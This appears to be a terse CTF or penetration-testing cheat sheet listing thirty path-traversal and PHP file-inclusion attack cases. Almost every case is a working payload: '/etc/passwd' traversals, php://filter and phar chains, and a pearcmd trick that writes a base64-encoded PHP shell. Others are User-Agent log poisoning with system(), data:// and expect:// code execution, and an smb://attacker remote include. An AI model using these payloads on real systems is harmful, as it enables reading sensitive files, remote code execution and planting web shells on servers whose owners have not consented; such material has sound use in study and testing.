# Real-World Cases — the patterns actual apps showed

## Case 1 — the `?page=` PHP-include — the classic

`?page=../../etc/passwd` — a `include $_GET['page'] . '.php'` — the
`+ .php` suffix-appended include — `?page=../../etc/passwd%00` for
PHP<5.3.4 — the include-RCE chain — `read-to-rce.md`.

## Case 2 — the download endpoint — the traverse-out

`/download?file=report.pdf` — `open("/var/files/" + $_GET['file'])` —
`?file=../../etc/passwd` — the download-endpoint traversal — the
`+`-concat traversal.

## Case 3 — the log-viewer — the admin-logs

`/admin/logs?file=x` — `/var/log/` confined — `?file=../../etc/passwd` —
the log-viewer confine-escape — the `/var/log/` base is visible in the
error — the confine-escape.

## Case 4 — the avatar-fetcher — the SSRF+file

`/avatar?url=x` — `file_get_contents($url)` — `?url=file:///etc/passwd` —
the SSRF-via-wrapper — `file://` reaches — `url-wrapper-matrix.md`.

## Case 5 — the lang-picker — the language-include

`?lang=fr` — `include "lang/" . $_GET['lang'] . ".php"` — `?lang=
../../etc/passwd%00` — the lang-include — `+ .php` suffix — `%00` era.

## Case 6 — the theme-picker — the theme-include

`?theme=dark` — `include "themes/" . $_GET['theme'] . "/style.php"` —
`?theme=../../etc/passwd%00` — the theme-include — `+ /style.php` suffix.

## Case 7 — the file-manager — the read-by-design

`/files?action=read&path=/etc/passwd` — a file-manager — the read is
the FEATURE — the sandbox is the confine — `?path=/etc/passwd` reads
if the sandbox doesn't confine.

## Case 8 — the unzip+view — the archive+include

`POST /unzip` → extracts → `GET /view?f=extracted/x` — `?f=../../etc/
passwd` — the unzip+view traversal — the archive+read chain.

## Case 9 — the `phar://` upload — the deser-trigger

`POST /upload` → `x.jpg` (a phar) → `GET /view?f=phar://./uploads/x.jpg/a` —
the phar-deser-trigger — `web-deserialization`.

## Case 10 — the `pearcmd` — the pear-write

`?page=/usr/local/lib/php/pearcmd.php&+config-create+/var/www/x.php+
PD9waHAgc3lzdGVtKCJpZCIpOz8+` — the pearcmd-write — a `+config-create`
+ path + code trick — writes `x.php` — `read-to-rce.md` ladder 9.

## Case 11 — the `session.upload_progress` — the sess-include

`PHP_SESSION_UPLOAD_PROGRESS` + `?page=/tmp/sess_<id>` — the session-
file-include — the sess_-include chain — `read-to-rce.md` ladder 6.

## Case 12 — the `/proc/self/fd/N` — the fd-include

`?page=/proc/self/fd/3` — an fd to a controlled file — the fd-include —
`read-to-rce.md` ladder 10.

## Case 13 — the `log-poison` — the UA-include

`User-Agent: <?php system($_GET[c]);?>` + `?page=/var/log/apache2/
access.log&c=id` — the log-poison-include — `log-poisoning.md`.

## Case 14 — the `wrapper-craft` — the filter-chain

`?file=php://filter/convert.iconv.utf-8.utf-16|convert.base64-encode/
resource=x.php` — the iconv+base64 filter-chain — a b64-safe read —
`php-wrappers.md`.

## Case 15 — the `?template=` — the SSTI-read

`?template={{config}}` — a template-read — `{{file}}` inside a
template — the read-to-SSTI edge — `web-ssti`.

## Case 16 — the `send_from_directory` — the Flask-confine

`send_from_directory('/files', name)` — werkzeug's `safe_join` — the
"safe" confine — historical traversal CVEs — the confine-check —
`denied-conditions.md`.

## Case 17 — the `express.static` — the Node-static

`express.static('/files')` + `?file=../../etc/passwd` — the static-
handler traversal — the `root:` confine — `per-stack.md`.

## Case 18 — the `http.ServeFile` — the Go-static

`http.ServeFile(w, r, path)` — the Go-serve — `..`-sanitization is
built-in modern-Go — the confine-check — `per-stack.md`.

## Case 19 — the `MapPath` — the .NET-confine

`Server.MapPath("~/x")` — the `~`-to-webroot map — `~/../../` fails —
the virtual-path confine — `per-stack.md`.

## Case 20 — the `getResourceAsStream` — the Java-classpath

`getClass().getResourceAsStream("/x")` — the classpath-resource —
`..` doesn't escape the classpath — `file:///` still works through
`FileInputStream` — `per-stack.md`.

## Case 21 — the `jar:` — the Java-archive

`jar:file:///x.jar!/WEB-INF/web.xml` — the jar-archive read — the
`jar:`-handler — `archive-deep.md`.

## Case 22 — the `netdoc:` — the Java-netdoc

`netdoc:///etc/passwd` — the netdoc-handler — the Java local-read —
`archive-deep.md`.

## Case 23 — the `webdav`/`cifs`/`smb` — the remote-fs

`smb://attacker/share/x` — the remote-fs — a `file://attacker/x` —
the remote-share read — out of scope for CTF usually.

## Case 24 — the `zip://` upload — the archive-include

`POST x.zip` → `?file=zip://./uploads/x.zip%23shell.php` — the
archive-include — `archive-deep.md`.

## Case 25 — the `glob://` — the listing

`?dir=glob:///*` — the glob-listing — `archive-deep.md`/`blind-read.md`.

## Case 26 — the `ssh2.*` — the ssh-handler

`ssh2.shell://user:pass@host:22/xterm` — the ssh-handler — `ssh2.*` —
the ssh-via-wrapper — `url-wrapper-matrix.md`.

## Case 27 — the `expect://` — the expect-handler

`expect://id` — the expect-PECL — the direct-exec — `url-wrapper-matrix.md`.

## Case 28 — the `php://filter` + `phar://` — the wrapper-chain

`php://filter/.../resource=phar://./x.jpg/a` — the filter+phar chain —
the compound-wrapper — `php-wrappers.md`.

## Case 29 — the `data:` — the inline-code

`?file=data://text/plain,<?php system("cat /flag");?>` — the data-
inline-code — `url-wrapper-matrix.md`.

## Case 30 — the `data:`+base64 — the b64-inline

`?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs/Pg==`
— the b64-inline — `url-wrapper-matrix.md`.
